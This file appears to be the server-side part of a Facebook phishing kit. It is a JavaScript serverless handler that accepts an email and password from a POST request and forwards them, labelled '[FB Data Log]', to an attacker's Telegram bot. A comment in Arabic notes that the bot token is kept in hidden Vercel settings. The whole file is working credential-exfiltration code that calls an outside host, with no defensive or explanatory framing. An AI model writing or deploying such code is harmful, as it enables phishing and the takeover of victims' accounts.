export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Not Allowed');

    const { e, p } = req.body;
    const token = process.env.BOT_TOKEN; // سيتم سحبه من إعدادات Vercel المخفية
    const chatId = process.env.CHAT_ID;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: `[FB Data Log]:\nEmail: ${e}\nPass: ${p}`
            })
        });
        res.status(200).json({ status: 'sent' });
    } catch (err) {
        res.status(500).json({ error: 'Failed' });
    }
}
